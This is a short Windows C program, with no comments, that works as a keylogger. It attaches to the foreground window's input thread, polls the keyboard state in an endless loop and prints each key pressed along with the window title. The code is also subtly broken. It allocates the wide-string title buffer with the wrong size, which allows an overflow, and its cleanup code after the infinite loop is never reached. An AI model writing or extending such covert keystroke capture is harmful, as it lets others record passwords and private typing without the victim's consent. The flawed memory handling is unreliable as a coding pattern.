#include<stdio.h>
#include<windows.h>

#define POLL_TIMEOUT_MS 100

int main(void) 
{
    HWND hWnd = GetForegroundWindow();
    if (hWnd == NULL) return -1;

    int title_len = GetWindowTextLength(hWnd);
    if (title_len == 0) return -1;

    wchar_t *title = (wchar_t *)malloc(title_len + 1 * sizeof(wchar_t));
    GetWindowTextW(hWnd, title, title_len + 1);

    DWORD tid = GetWindowThreadProcessId(hWnd, NULL);
    if (tid == 0) return -1;

    BYTE keyboard_state[256];
    if (AttachThreadInput(GetCurrentThreadId(), tid, TRUE)) 
    {
        while (1) 
        {
            if (GetKeyboardState(keyboard_state)) 
            {
                for (int key = 0x08; key < 0xFE; key++) 
                {
                    if (keyboard_state[key] & 0x80) 
                    {
                        int vsc = MapVirtualKey(key, MAPVK_VK_TO_VSC);
                        wchar_t real_key[5];
                        int real_len = ToUnicode(key, vsc, keyboard_state, real_key, 4, 0);
                        if (real_len <= 0) 
                        {
                            wprintf(L"Key: 0x%2x, Window: %ls\n", key, title);
                            continue;
                        }
                        real_key[real_len] = '\0';
                        wprintf(L"Key: %s, Window: %ls\n", real_key, title);
                    }
                }
            }

            Sleep(POLL_TIMEOUT_MS);
        }

        AttachThreadInput(GetCurrentThreadId(), tid, FALSE);
    }
    free(title);
    return 0;
}
